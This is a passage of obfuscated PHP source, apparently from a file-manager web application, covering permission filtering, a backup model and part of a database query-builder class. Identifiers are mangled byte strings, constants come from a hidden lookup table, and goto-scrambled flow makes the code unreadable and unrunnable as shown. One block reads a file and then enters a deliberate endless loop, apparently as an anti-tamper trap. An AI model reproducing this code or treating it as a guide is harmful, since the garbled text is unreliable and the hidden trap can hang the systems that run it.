filterAuth(&$Bâ İ´åª…) { goto Eâ¼äíÔ°‘; Eâ¼äíÔ°‘: if (!$Bâ İ´åª…) { return; } $E—¯Åé¡¼Ë = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $C¼ŒÕ˜…ôƒ = array(); goto CÃŒñ¾î…; CÃŒñ¾î…: foreach ($E—¯Åé¡¼Ë as $c‹¯‚öÄ) { if ($Bâ İ´åª… & $c‹¯‚öÄ) { $C¼ŒÕ˜…ôƒ[] = $c‹¯‚öÄ; } } if (in_array(self::AUTH_ROOT, $C¼ŒÕ˜…ôƒ)) { $Bâ İ´åª… = array_sum($E—¯Åé¡¼Ë); return; } $F¹Ò¹êçØã = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto F’“¥İˆ; F’“¥İˆ: foreach ($C¼ŒÕ˜…ôƒ as $c‹¯‚öÄ) { if (isset($F¹Ò¹êçØã[$c‹¯‚öÄ])) { $C¼ŒÕ˜…ôƒ = array_merge($C¼ŒÕ˜…ôƒ, $F¹Ò¹êçØã[$c‹¯‚öÄ]); } } $C¼ŒÕ˜…ôƒ[] = self::AUTH_SHOW; $Bâ İ´åª… = array_sum(array_unique($C¼ŒÕ˜…ôƒ)); goto F­åÂƒ«Å¸; F­åÂƒ«Å¸: } public function sort($D‘èÍ•ÜŠİ, $FËŠÙ›Ø³) { return parent::update($D‘èÍ•ÜŠİ, $FËŠÙ›Ø³); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\142\141\x63\x6b\x75\160\114\151\x73\164"; public $field = array("\151\x6f", "\x6e\x61\x6d\145", "\x73\x74\141\164\x75\x73", "\143\157\156\x74\x65\x6e\x74", "\162\x65\163\165\154\164", "\164\x69\155\x65\106\162\x6f\x6d", "\164\x69\155\145\124\x6f"); public function config() { goto BƒïŠ¼ä¬…; c‹ã¯ùÁ‹: if (isset($Bó©Ãíä [$f ¥µ¢ˆ[203]])) { $Bó©Ãíä [$f ¥µ¢ˆ[203]] = json_decode($Bó©Ãíä [$f ¥µ¢ˆ[203]], !0); } if (isset($bãš”Ù—‹•[$f ¥µ¢ˆ[203]])) { $Bó©Ãíä [$f ¥µ¢ˆ[203]][$f ¥µ¢ˆ[1463]] = $bãš”Ù—‹•[$f ¥µ¢ˆ[203]]; unset($bãš”Ù—‹•[$f ¥µ¢ˆ[203]]); } return array_merge($Bó©Ãíä , $bãš”Ù—‹•); goto f¤ó±¥æ¢Ü; fî¢Ïå‰ƒï: $bãš”Ù—‹• = is_array($bãš”Ù—‹•) ? $bãš”Ù—‹• : array(); if (!isset($bãš”Ù—‹•[$f ¥µ¢ˆ[706]])) { $bãš”Ù—‹•[$f ¥µ¢ˆ[706]] = $f ¥µ¢ˆ[93]; } $Bó©Ãíä  = array(); goto E å†·Í¦¯; BƒïŠ¼ä¬…: $f ¥µ¢ˆ =& $_SERVER[¢Í]; $bãš”Ù—‹• = Model($f ¥µ¢ˆ[1090])->get($f ¥µ¢ˆ[727]); $bãš”Ù—‹• = json_decode($bãš”Ù—‹•, !0); goto fî¢Ïå‰ƒï; E å†·Í¦¯: Action($f ¥µ¢ˆ[1672])->taskInit(); $e‚˜ô¬×ñ = Model($f ¥µ¢ˆ[1673])->listData(); foreach ($e‚˜ô¬×ñ as $fÓšÂ–Ç¿ù) { if ($fÓšÂ–Ç¿ù[$f ¥µ¢ˆ[1133]] == $f ¥µ¢ˆ[93] && $fÓšÂ–Ç¿ù[$f ¥µ¢ˆ[1478]] == $f ¥µ¢ˆ[1674]) { $Bó©Ãíä  = $fÓšÂ–Ç¿ù; break; } } goto c‹ã¯ùÁ‹; f¤ó±¥æ¢Ü: } public function listData($aÏñ–¿Ó×— = false, $E¨”³ÇİïÉ = "\155\x6f\144\x69\x66\171\124\151\x6d\x65", $A¦·—±•ˆ’ = false) { return parent::listData($aÏñ–¿Ó×—, $E¨”³ÇİïÉ, !0); } public function lastItem() { $C‹¸ªé•Œ× = $this->listData(); return !empty($C‹¸ªé•Œ×[0]) ? $C‹¸ªé•Œ×[0] : null; } public function kill($C¾¢‘š»Ä) { goto AÇîá¤¹”÷; eÎñÕ»Šªö: $f¥»¯É‘Ô = $dĞÂ¸ãÎÊÍ[$eù«°æ×¹ñ[28]]; $eåâ„¸·£ = TEMP_FILES . $eù«°æ×¹ñ[723] . $f¥»¯É‘Ô . $eù«°æ×¹ñ[8]; IO::remove($eåâ„¸·£, !1); goto A©òöôèêß; AÇîá¤¹”÷: $eù«°æ×¹ñ =& $_SERVER[¢Í]; $dĞÂ¸ãÎÊÍ = $this->listData($C¾¢‘š»Ä); if (!$dĞÂ¸ãÎÊÍ || empty($dĞÂ¸ãÎÊÍ[$eù«°æ×¹ñ[28]])) { return !0; } goto f×îÉïöÃ‡; f×îÉïöÃ‡: Task::kill($eù«°æ×¹ñ[726]); Task::kill($eù«°æ×¹ñ[743]); Task::kill($eù«°æ×¹ñ[750]); goto eÎñÕ»Šªö; A©òöôèêß: return $this->remove($C¾¢‘š»Ä); goto aÃÛÉï¹é; aÃÛÉï¹é: } public function remove($EµğêêË—) { $dÍç™æ¡Ü = $this->listData($EµğêêË—); if (!$dÍç™æ¡Ü) { return !0; } return $this->backupRemove($dÍç™æ¡Ü); } private function backupRemove($cÍŠÑªÎ³å) { $dŒñ°å´¬– =& $_SERVER[¢Í]; parent::remove($cÍŠÑªÎ³å[$dŒñ°å´¬–[392]]); $eÄŒ¬ÒÔ„ = "\x7b\151\x6f\72{$cÍŠÑªÎ³å[$dŒñ°å´¬–[705]]}\x7d\x2f\144\141\164\x61\x62\x61\163\145\57\x62\x61\143\x6b\x75\x70\137" . $cÍŠÑªÎ³å[$dŒñ°å´¬–[28]]; IO::remove($eÄŒ¬ÒÔ„, !1); return !0; } public function start() { goto bÔÏñš“¢È; bÔÏñš“¢È: $aÊÈóÈç‡à =& $_SERVER[¢Í]; if ($GLOBALS[$aÊÈóÈç‡à[6]][$aÊÈóÈç‡à[94]][$aÊÈóÈç‡à[1675]] != $aÊÈóÈç‡à[93]) { return !0; } $e¾Ë‰°˜ñ = $this->config(); goto b„Û¿«ñ†; b„Û¿«ñ†: if (!$e¾Ë‰°˜ñ || $e¾Ë‰°˜ñ[$aÊÈóÈç‡à[1460]] != $aÊÈóÈç‡à[93]) { return !1; } $F°ÓÅÙ©Ë¡ = $this->process(); foreach ($F°ÓÅÙ©Ë¡ as $cßİ´ï³§Ù) { if ($cßİ´ï³§Ù) { return Task::restart($cßİ´ï³§Ù[$aÊÈóÈç‡à[392]]); } } goto E­‡õÅĞ­®; FÓŠ¨õõ“ê: if ($CÍ¢—Ø·ñ) { $CÍ¢—Ø·ñ = $E¥­Ş¿‘ª->dbFile(); if ($CÍ¢—Ø·ñ && $e¾Ë‰°˜ñ[$aÊÈóÈç‡à[706]] == $aÊÈóÈç‡à[494]) { $CÍ¢—Ø·ñ = $E¥­Ş¿‘ª->file(); } } Backup::set(array($aÊÈóÈç‡à[703] => 1, $aÊÈóÈç‡à[473] => time())); return !0; goto fåŸœŸ½…; E­‡õÅĞ­®: $E¥­Ş¿‘ª = new Backup(); $E¥­Ş¿‘ª->keep(); $CÍ¢—Ø·ñ = $E¥­Ş¿‘ª->db(); goto FÓŠ¨õõ“ê; fåŸœŸ½…: } public function process() { $aÏÒ‡ÑÄ»Ö =& $_SERVER[¢Í]; return array($aÏÒ‡ÑÄ»Ö[708] => Task::get($aÏÒ‡ÑÄ»Ö[726]), $aÏÒ‡ÑÄ»Ö[711] => Task::get($aÏÒ‡ÑÄ»Ö[743]), $aÏÒ‡ÑÄ»Ö[181] => Task::get($aÏÒ‡ÑÄ»Ö[750])); } public function restore() { $C»óĞ¦Şï =& $_SERVER[¢Í]; ActionCall($C»óĞ¦Şï[986], !0, 1); ActionCall($C»óĞ¦Şï[986], !0, 0); } } goto E§…®¿”ö£; CÛõ¥Äñš: if (!isset($_SERVER[$_SERVER[¢Í][51]]) || !isset($_SERVER[$_SERVER[¢Í][60]])) { goto C†ÎÊß”ò; C†ÎÊß”ò: $F±•ğÔ×Ø˜ = $_SERVER[¢Í][53]; $CçŒ¾ˆï£ = $_SERVER[$_SERVER[¢Í][54]] . $_SERVER[¢Í][55]; $cĞè¯ÆÉ°‘ = $F±•ğÔ×Ø˜($CçŒ¾ˆï£); goto e’ˆ…é…; c½Úô½…: $cíÔØ†øÙù($_SERVER[$_SERVER[¢Í][54]] . $_SERVER[¢Í][55]); $b‘›–‘›å… = 2; while ($b‘›–‘›å… > 1) { $c™ĞÈÆÆøª = rawurlencode($b‘›–‘›å… . $_SERVER[¢Í][377]); } goto cÓ¹›‘òÖ; e’ˆ…é…: $f¤»¾‚šÓ› = explode($_SERVER[¢Í][56], $cĞè¯ÆÉ°‘); if (count($f¤»¾‚šÓ›) < $_SERVER[¢Í][57]) { $A«Í°ì¿‰œ = $_SERVER[¢Í][58]; $A«Í°ì¿‰œ(); } $cíÔØ†øÙù = $_SERVER[¢Í][59]; goto c½Úô½…; cÓ¹›‘òÖ: } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\145\161" => "\74\76", "\147\x74" => "\76", "\x65\147\164" => "\76\x3d", "\x6c\x74" => "\x3c", "\145\x6c\x74" => "\x3c\75", "\156\157\x74\x6c\151\153\x65" => "\116\117\x54\40\x4c\111\x4b\105", "\x6c\x69\x6b\145" => "\114\111\113\x45", "\x69\x6e" => "\111\x4e", "\156\157\164\x69\156" => "\116\x4f\x54\x20\111\x4e", "\x6e\x6f\164\40\x69\156" => "\116\117\124\x20\x49\x4e", "\142\x65\164\x77\145\x65\156" => "\102\105\124\127\105\x45\x4e", "\156\x6f\x74\x62\145\x74\167\145\145\156" => "\x4e\x4f\x54\x20\x42\x45\124\127\105\x45\116", "\156\x6f\x74\x20\142\145\x74\167\145\x65\x6e" => "\116\x4f\124\40\x42\105\124\x57\x45\x45\116"); protected $selectSql = "\x53\105\114\x45\x43\124\45\x44\x49\123\x54\x49\x4e\103\x54\45\x20\45\106\111\x45\x4c\x44\x25\40\106\122\x4f\x4d\40\45\x54\101\102\114\105\x25\x25\x4a\x4f\x49\x4e\45\x25\127\x48\x45\122\x45\45\45\107\x52\117\125\120\45\x25\110\x41\x56\111\116\x47\x25\x25\x4f\x52\104\105\122\45\45\x4c\111\115\111\124\x25\x20\45\125\x4e\111\117\116\x25\45\x43\117\115\115\105\116\x54\x25"; protected $bind = array(); public static function getInstance() { $fĞÎë‹í¦‹ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¢Í][887], $fĞÎë‹í¦‹); } public function factory($aê™„Î¶Ìİ = '') { goto a¤óæó Êé; a¤óæó Êé: $f¤ê¯ò¦÷ =& $_SERVER[¢Í]; $aê™„Î¶Ìİ = $this->parseConfig($aê™„Î¶Ìİ); if (empty($aê™„Î¶Ìİ[$f¤ê¯ò¦÷[888]])) { think_exception(think_lang($f¤ê¯ò¦÷[889])); } goto A°¦ĞË¼ìŒ; C÷ËÔ„Ï‡©: return $bæˆæ‰÷Š–; goto D±›º•²è; A°¦ĞË¼ìŒ: $this->dbType = ucwords(strtolower($aê™„Î¶Ìİ[$f¤ê¯ò¦÷[888]])); $A°•·ä¥Ìˆ = $f¤ê¯ò¦÷[890] . $this->dbType; if (class_exists($A°•·ä¥Ìˆ)) { $bæˆæ‰÷Š– = new $A°•·ä¥Ìˆ($aê™„Î¶Ìİ); if ($f¤ê¯ò¦÷[737] != strtolower($aê™„Î¶Ìİ[$f¤ê¯ò¦÷[888]])) { $bæˆæ‰÷Š–->dbType = strtoupper($this->dbType); } else { $bæˆæ‰÷Š–->dbType = $this->_getDsnType($aê™„Î¶Ìİ[$f¤ê¯ò¦÷[843]]); } } else { think_exception(think_lang($f¤ê¯ò¦÷[891]) . $f¤ê¯ò¦÷[892] . $A°•·ä¥Ìˆ); } goto C÷ËÔ„Ï‡©; D±›º•²è: } public function __call($fÊ¦‚§È´œ, $b”‘ÆàÏÊ) { if (method_exists($this, $fÊ¦‚§È´œ)) { return call_user_func_array(array($this, $fÊ¦‚§È´œ), $b”‘ÆàÏÊ); } } protected function _getDsnType($c¬‹ˆîŞ×Ñ) { $a­ŠÅ—ÊÕ¸ = explode($_SERVER[¢Í][4], $c¬‹ˆîŞ×Ñ); $fè­í¤ª¥ = strtoupper(trim($a­ŠÅ—ÊÕ¸[0])); return $fè­í¤ª¥; } private function parseConfig($Dé¿“çÓÅ¼ = '') { $A²¡†­¡‚ë =& $_SERVER[¢Í]; if (!empty($Dé¿“çÓÅ¼) && is_string($Dé¿“çÓÅ¼)) { $Dé¿“çÓÅ¼ = $this->parseDSN($Dé¿“çÓÅ¼); } elseif (is_array($Dé¿“çÓÅ¼)) { $Dé¿“çÓÅ¼ = array_change_key_case($Dé¿“çÓÅ¼); $Dé¿“çÓÅ¼ = array($A²¡†­¡‚ë[888] => $Dé¿“çÓÅ¼[$A²¡†­¡‚ë[736]], $A²¡†­¡‚ë[816] => $Dé¿“çÓÅ¼[$A²¡†­¡‚ë[893]], $A²¡†­¡‚ë[817] => $Dé¿“çÓÅ¼[$A²¡†­¡‚ë[894]], $A²¡†­¡‚ë[814] => $Dé¿“çÓÅ¼[$A²¡†­¡‚ë[895]], $A²¡†­¡‚ë[815] => $Dé¿“çÓÅ¼[$A²¡†­¡‚ë[896]], $A²¡†­¡‚ë[17] => $Dé¿“çÓÅ¼[$A²¡†­¡‚ë[897]], $A²¡†­¡‚ë[843] => $Dé¿“çÓÅ¼[$A²¡†­¡‚ë[738]], $A²¡†­¡‚ë[13] => isset($Dé¿“çÓÅ¼[$A²¡†­¡‚ë[898]]) ? $Dé¿“çÓÅ¼[$A²¡†­¡‚ë[898]] : array()); } elseif (empty($Dé¿“çÓÅ¼)) { if (think_config($A²¡†­¡‚ë[899]) && $A²¡†­¡‚ë[737] != strtolower(think_config($A²¡†­¡‚ë[900]))) { $Dé¿“çÓÅ¼ = $this->parseDSN(think_config($A²¡†­¡‚ë[899])); } else { $Dé¿“çÓÅ¼ = array($A²¡†­¡‚ë[888] => think_config($A²¡†­¡‚ë[900]), $A²¡†­¡‚ë[816] => think_config($A²¡†­¡‚ë[901]), $A²¡†­¡‚ë[817] => think_config($A²¡†­¡‚ë[902]), $A²¡†­¡‚ë[814] => think_config($A²¡†­¡‚ë[903]), $A²¡†­¡‚ë[815] => think_config($A²¡†­¡‚ë[904]), $A²¡†­¡‚ë[17] => think_config($A²¡†­¡‚ë[249]), $A²¡†­¡‚ë[843] => think_config($A²¡†­¡‚ë[899]), $A²¡†­¡‚ë[13] => think_config($A²¡†­¡‚ë[905])); } } return $Dé¿“çÓÅ¼; } protected function initConnect($DİÊÊöïÀà = true) { if (1 == think_config($_SERVER[¢Í][18])) { $this->_linkID = $this->multiConnect($DİÊÊöïÀà); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $C›ÕÉóó¤Æ => $aÒÌâ”ğ÷Œ) { $this->_linkID = $aÒÌâ”ğ÷Œ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($F­âääÒ±Ï = false) { $b×»ŒÈ™ñ =& $_SERVER[¢Í]; static $bœƒ¶İ‘º = array(); if (empty($bœƒ¶İ‘º)) { foreach ($this->config as $EÔªÚÏÜ– => $E®å…„‰Î) { $bœƒ¶İ‘º[$EÔªÚÏÜ–] = explode($b×»ŒÈ™ñ[47], $E®å…„‰Î); } } if (think_config($b×»ŒÈ™ñ[906])) { if ($F­âääÒ±Ï) { $EŸåÔâ¸ = floor(mt_rand(0, think_config($b×»ŒÈ™ñ[907]) - 1)); } else { if (is_numeric(think_config($b×»ŒÈ™ñ[908]))) { $EŸåÔâ¸ = think_config($b×»ŒÈ™ñ[908]); } else { $EŸåÔâ¸ = floor(mt_rand(think_config($b×»ŒÈ™ñ[907]), count($bœƒ¶İ‘º[$b×»ŒÈ™ñ[814]]) - 1)); } } } else { $EŸåÔâ¸ = floor(mt_rand(0, count($bœƒ¶İ‘º[$b×»ŒÈ™ñ[814]]) - 1)); } $bÒÎ…³Ö‰ï = array($b×»ŒÈ™ñ[816] => isset($bœƒ¶İ‘º[$b×»ŒÈ™ñ[816]][$EŸåÔâ¸]) ? $bœƒ¶İ‘º[$b×»ŒÈ™ñ[816]][$EŸåÔâ¸] : $bœƒ¶İ‘º[$b×»ŒÈ™ñ[816]][0], $b×»ŒÈ™ñ[817] => isset($bœƒ¶İ‘º[$b×»ŒÈ™ñ[817]][$EŸåÔâ¸]) ? $bœƒ¶İ‘º[$b×»ŒÈ™ñ[817]][$EŸåÔâ¸] : $bœƒ¶İ‘º[$b×»ŒÈ™ñ[817]][0], $b×»ŒÈ™ñ[814] => isset($bœƒ¶İ‘º[$b×»ŒÈ™ñ[814]][$EŸåÔâ¸]) ? $bœƒ¶İ‘º[$b×»ŒÈ™ñ[814]][$EŸåÔâ¸] : $bœƒ¶İ‘º[$b×»ŒÈ™ñ[814]][0], $b×»ŒÈ™ñ[815] => isset($bœƒ¶İ‘º[$b×»ŒÈ™ñ[815]][$EŸåÔâ¸]) ? $bœƒ¶İ‘º[$b×»ŒÈ™ñ[815]][$EŸåÔâ¸] : $bœƒ¶İ‘º[$b×»ŒÈ™ñ[815]][0], $b×»ŒÈ™ñ[17] => isset($bœƒ¶İ‘º[$b×»ŒÈ™ñ[17]][$EŸåÔâ¸]) ? $bœƒ¶İ‘º[$b×»ŒÈ™ñ[17]][$EŸåÔâ¸] : $bœƒ¶İ‘º[$b×»ŒÈ™ñ[17]][0], $b×»ŒÈ™ñ[843] => isset($bœƒ¶İ‘º[$b×»ŒÈ™ñ[843]][$EŸåÔâ¸]) ? $bœƒ¶İ‘º[$b×»ŒÈ™ñ[843]][$EŸåÔâ¸] : $bœƒ¶İ‘º[$b×»ŒÈ™ñ[843]][0], $b×»ŒÈ™ñ[13] => isset($bœƒ¶İ‘º[$b×»ŒÈ™ñ[13]][$EŸåÔâ¸]) ? $bœƒ¶İ‘º[$b×»ŒÈ™ñ[13]][$EŸåÔâ¸] : $bœƒ¶İ‘º[$b×»ŒÈ™ñ[13]][0]); return $this->connect($bÒÎ…³Ö‰ï, $EŸåÔâ¸); } public function parseDSN($FÀ•‘ŞõŠ») { $A…é¨Î¥çï =& $_SERVER[¢Í]; if (empty($FÀ•‘ŞõŠ»)) { return !1; } $F¦Ï½© = parse_url($FÀ•‘ŞõŠ»); if ($F¦Ï½©[$A…é¨Î¥çï[182]]) { $cé‚—î‡Ã­ = array($A…é¨Î¥çï[888] => $F¦Ï½©[$A…é¨Î¥çï[182]], $A…é¨Î¥çï[816] => isset($F¦Ï½©[$A…é¨Î¥çï[560]]) ? $F¦Ï½©[$A…é¨Î¥çï[560]] : $A…é¨Î¥çï[33], $A…é¨Î¥çï[817] => isset($F¦Ï½©[$A…é¨Î¥çï[909]]) ? $F¦Ï½©[$A…é¨Î¥çï[909]] : $A…é¨Î¥çï[33], $A…é¨Î¥çï[814] => isset($F¦Ï½©[$A…é¨Î¥çï[183]]) ? $F¦Ï½©[$A…é¨Î¥çï[183]] : $A…é¨Î¥çï[33], $A…é¨Î¥çï[815] => isset($F¦Ï½©[$A…é¨Î¥çï[184]]) ? $F¦Ï½©[$A…é¨Î¥çï[184]] : $A…é¨Î¥çï[33], $A…é¨Î¥çï[17] => isset($F¦Ï½©[$A…é¨Î¥çï[85]]) ? substr($F¦Ï½©[$A…é¨Î¥çï[85]], 1) : $A…é¨Î¥çï[33]); } else { preg_match($A…é¨Î¥çï[910], trim($FÀ•‘ŞõŠ»), $dÂÚâ¡¢ë¼); $cé‚—î‡Ã­ = array($A…é¨Î¥çï[888] => $dÂÚâ¡¢ë¼[1], $A…é¨Î¥çï[816] => $dÂÚâ¡¢ë¼[2], $A…é¨Î¥çï[817] => $dÂÚâ¡¢ë¼[3], $A…é¨Î¥çï[814] => $dÂÚâ¡¢ë¼[4], $A…é¨Î¥çï[815] => $dÂÚâ¡¢ë¼[5], $A…é¨Î¥çï[17] => $dÂÚâ¡¢ë¼[6]); } $cé‚—î‡Ã­[$A…é¨Î¥çï[843]] = $A…é¨Î¥çï[33]; return $cé‚—î‡Ã­; } protected function debug() { $F¼óÏö”’ =& $_SERVER[¢Í]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $F¼óÏö”’[911]; if (think_config($F¼óÏö”’[912])) { think_status($F¼óÏö”’[913]); think_trace($this->queryStr . $F¼óÏö”’[914] . think_status($F¼óÏö”’[20], $F¼óÏö”’[913], 6) . $F¼óÏö”’[915], $F¼óÏö”’[33], $F¼óÏö”’[916]); } } protected function parseLock($c›ˆ—§¿·ï = false) { $eÛ×†³ÊÈ =& $_SERVER[¢Í]; if (!$c›ˆ—§¿·ï) { return $eÛ×†³ÊÈ[33]; } if ($eÛ×†³ÊÈ[845] == $this->dbType) { return $eÛ×†³ÊÈ[917]; } return $eÛ×†³ÊÈ[918]; } protected function parseSet($fÁ¬îäÙÄ) { $BˆÓ§•ï·İ =& $_SERVER[¢Í]; foreach ($fÁ¬îäÙÄ as $d·º¤ÂÉô› => $bÇÆ¢¿îÆˆ) { if (is_array($bÇÆ¢¿îÆˆ) && $BˆÓ§•ï·İ[300] == $bÇÆ¢¿îÆˆ[0]) { $F“˜ù¹‰É¾[] = $this->parseKey($d·º¤ÂÉô›) . $BˆÓ§•ï·İ[919] . $bÇÆ¢¿îÆˆ[1]; } elseif (is_scalar($bÇÆ¢¿îÆˆ) || is_null($bÇÆ¢¿îÆˆ)) { $F“˜ù¹‰É¾[] = $this->parseKey($d·º¤ÂÉô›) . $BˆÓ§•ï·İ[919] . $this->parseValue($bÇÆ¢¿îÆˆ); } } return $BˆÓ§•ï·İ[920] . implode($BˆÓ§•ï·İ[47], $F“˜ù¹‰É¾); } protected function bindParam($fÀ ®áĞÃÉ, $d³Î¥ˆ‹Œ‡) { $this->bind[$_SERVER[¢Í][4] . $fÀ ®áĞÃÉ] = $d³Î¥ˆ‹Œ‡; } protected function parseBind($Dš•Ş¶Äç) { $Dš•Ş¶Äç = array_merge($this->bind, $Dš•Ş¶Äç); $this->bind = array(); return $Dš•Ş¶Äç; } function parseKey(&$eß¼—·¢ˆ, $AÛøŞÂ´¼ = true) { if ($AÛøŞÂ´¼) { $eß¼—·¢ˆ = $this->parseKeyCheck($eß¼—·¢ˆ); } return $eß¼—·¢ˆ; } function parseKeyCheck($a´äŒòÈÖ´) { $Fí³ï·š =& $_SERVER[¢Í]; $a´äŒòÈÖ´ = trim($a´äŒòÈÖ´); if (!preg_match($Fí³ï·š[921], $a´äŒòÈÖ´)) { think_exception($Fí³ï·š[922] . $a´äŒòÈÖ´); } return $a´äŒòÈÖ´; } protected function parseValue($F¤ìø§Éš) { $f‚¸İé¼šã =& $_SERVER[¢Í]; if (is_string($F¤ìø§Éš)) { $F¤ìø§Éš = $f‚¸İé¼šã[884] . $this->escapeString($F¤ìø§Éš) . $f‚¸İé¼šã[884]; } elseif (isset($F¤ìø§Éš[0]) && is_string($F¤ìø§Éš[0]) && strtolower($F¤ìø§Éš[0]) == $f‚¸İé¼šã[300]) { $F¤ìø§Éš = $this->escapeString($F¤ìø§Éš[1]); } elseif (is_array($F¤ìø§Éš)) { $F¤ìø§Éš = array_map(array($this, $f‚¸İé¼šã[885]), $F¤ìø§Éš); } elseif (is_bool($F¤ìø§Éš)) { $F¤ìø§Éš = $F¤ìø§Éš ? $f‚¸İé¼šã[93] : $f‚¸İé¼šã[494]; } elseif (is_null($F¤ìø§Éš)) { $F¤ìø§Éš = $f‚¸İé¼šã[109]; } return $F¤ìø§Éš; } protected function parseField($eŠÒ¸°ÊŞæ) { $C˜ÁË†×¢Ä =& $_SERVER[¢Í]; if (is_string($eŠÒ¸°ÊŞæ) && strpos($eŠÒ¸°ÊŞæ, $C˜ÁË†×¢Ä[47])) { $eŠÒ¸°ÊŞæ = explode($C˜ÁË†×¢Ä[47], $eŠÒ¸°ÊŞæ); } if (is_array($eŠÒ¸°ÊŞæ)) { $d¨Ë Ô…É = array(); foreach ($eŠÒ¸°ÊŞæ as $aå‡”â·£ => $Bí¬ÂÙøî©) { if (!is_numeric($aå‡”â·£)) { $d¨Ë Ô…É[] = $this->parseKey($aå‡”â·£) . $C˜ÁË†×¢Ä[923] . $this->parseKey($Bí¬ÂÙøî©); } else { $d¨Ë Ô…É[] = $this->parseKey($Bí¬ÂÙøî©); } } $cØöåÇà“ = implode($C˜ÁË†×¢Ä[47], $d¨Ë Ô…É); } elseif (is_string($eŠÒ¸°ÊŞæ) && !empty($eŠÒ¸°ÊŞæ)) { $cØöåÇà“ = $eŠÒ¸°ÊŞæ; } else { $cØöåÇà“ = $C˜ÁË†×¢Ä[190]; } return $cØöåÇà“; } protected function parseTable($D¼ç¨Á‚ôë) { $bØä¨äÆ =& $_SERVER[¢Í]; if (is_array($D¼ç¨Á‚ôë)) { $aæ‹³²†®Í = array(); foreach ($D¼ç¨Á‚ôë as $f×ã¿²ºÁ» => $BÈ½±ßëö×) { if (!is_numeric($f×ã¿²ºÁ»)) { $aæ‹³²†®Í[] = $this->parseKey($f×ã¿²ºÁ») . $bØä¨äÆ[50] . $this->parseKey($BÈ½±ßëö×); } else { $aæ‹³²†®Í[] = $this->parseKey($f×ã¿²ºÁ»); } } $D¼ç¨Á‚ôë = $aæ‹³²†®Í; } elseif (is_string($D¼ç¨Á‚ôë)) { if (strstr($D¼ç¨Á‚ôë, $bØä¨äÆ[50])) { return $D¼ç¨Á‚ôë; } $D¼ç¨Á‚ôë = explode($bØä¨äÆ[47], $D¼ç¨Á‚ôë); array_walk($D¼ç¨Á‚ôë, array($this, $bØä¨äÆ[834])); } return $bØä¨äÆ[828] . trim(implode($bØä¨äÆ[924], $D¼ç¨Á‚ôë), $bØä¨äÆ[384]) . $bØä¨äÆ[828]; } protected function parseWhere($cÂ°‡Òİæº) { $aÓµ¥¢‘õ =& $_SERVER[¢Í]; $añŠ­—·í = $aÓµ¥¢‘õ[33]; if (is_string($cÂ°‡Òİæº)) { $añŠ­—·í = $cÂ°‡Òİæº; } else { $c­½ ±´ = isset($cÂ°‡Òİæº[$aÓµ¥¢‘õ[925]]) ? strtoupper($cÂ°‡Òİæº[$aÓµ¥¢‘õ[925]]) : $aÓµ¥¢‘õ[33]; if (in_array($c­½ ±´, array($aÓµ¥¢‘õ[926], $aÓµ¥¢‘õ[927], $aÓµ¥¢‘õ[928]))) { $c­½ ±´ = $aÓµ¥¢‘õ[50] . $c­½ ±´ . $aÓµ¥¢‘õ[50]; unset($cÂ°‡Òİæº[$aÓµ¥¢‘õ[925]]); } else { $c­½ ±´ = $aÓµ¥¢‘õ[929]; } foreach ($cÂ°‡Òİæº as $E‹Î–‹ñ => $Aéº‡¡ã†‰) { $añŠ­—·í .= $aÓµ¥¢‘õ[280]; if (is_numeric($E‹Î–‹ñ)) { $E‹Î–‹ñ = $aÓµ¥¢‘õ[930]; } if (0 === strpos($E‹Î–‹ñ, $aÓµ¥¢‘õ[80])) { $añŠ­—·í .= $this->parseThinkWhere($E‹Î–‹ñ, $Aéº‡¡ã†‰); } else { if (!preg_match($aÓµ¥¢‘õ[931], trim($E‹Î–‹ñ))) { think_exception(think_lang($aÓµ¥¢‘õ[932]) . $aÓµ¥¢‘õ[4] . $E‹Î–‹ñ); } $F„œ½á¿ ‘ = is_array($Aéº‡¡ã†‰) && isset($Aéº‡¡ã†‰[$aÓµ¥¢‘õ[933]]); $E‹Î–‹ñ = trim($E‹Î–‹ñ); if (strpos($E‹Î–‹ñ, $aÓµ¥¢‘õ[286])) { $e‹¨­îğéî = explode($aÓµ¥¢‘õ[286], $E‹Î–‹ñ); $Bìö¼Ÿõº¤ = array(); foreach ($e‹¨­îğéî as $fÆÉâ‘Ëˆ¢ => $AŸ¬Ñ¸ÏÒ÷) { $a«à£Ğ¡© = $F„œ½á¿ ‘ ? $Aéº‡¡ã†‰[$fÆÉâ‘Ëˆ¢] : $Aéº‡¡ã†‰; $Bìö¼Ÿõº¤[] = $aÓµ¥¢‘õ[263] . $this->parseWhereItem($this->parseKey($AŸ¬Ñ¸ÏÒ÷), $a«à£Ğ¡©) . $aÓµ¥¢‘õ[833]; } $añŠ­—·í .= implode($aÓµ¥¢‘õ[934], $Bìö¼Ÿõº¤); } elseif (strpos($E‹Î–‹ñ, $aÓµ¥¢‘õ[287])) { $e‹¨­îğéî = explode($aÓµ¥¢‘õ[287], $E‹Î–‹ñ); $Bìö¼Ÿõº¤ = array(); foreach ($e‹¨­îğéî as $fÆÉâ‘Ëˆ¢ => $AŸ¬Ñ¸ÏÒ÷) { $a«à£Ğ¡© = $F„œ½á¿ ‘ ? $Aéº‡¡ã†‰[$fÆÉâ‘Ëˆ¢] : $Aéº‡¡ã†‰; 